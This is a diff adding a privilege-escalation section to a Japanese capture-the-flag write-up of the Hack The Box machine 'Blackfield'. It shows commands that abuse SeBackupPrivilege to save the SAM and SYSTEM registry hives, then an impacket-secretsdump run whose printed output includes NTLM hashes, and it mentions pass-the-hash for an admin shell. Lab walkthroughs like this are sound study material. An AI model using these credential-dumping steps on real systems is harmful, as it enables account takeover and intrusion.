@@ -198,3 +198,54 @@ luid 406458
 blackfield\svc_backup
 ```
 
+# Privesc
+
+```
+*Evil-WinRM* PS C:\Users\svc_backup> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+SeBackupPrivilegeとSeRestorePrivilegeの両方の権限があるのでSAMとSYSTEMが読める。
+
+※ SAMとSYSTEMについては[ここ](https://jp.sentinelone.com/blog/windows-security-essentials-preventing-4-common-methods-of-credentials-exfiltration/)
+
+
+```
+*Evil-WinRM* PS C:\Users\svc_backup> reg save HKLM\sam .\sam
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc_backup> reg save HKLM\system .\system
+The operation completed successfully.
+```
+SAMとSYSTEMをKaliに送信する。その後、次のようにハッシュをダンプする：
+
+```
+┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
+└─$ impacket-secretsdump -sam sam -system system LOCAL
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Cleaning up...
+```
+
+あとはPass-the-HashでAdminのシェルをとる：
+
+```
+```
+
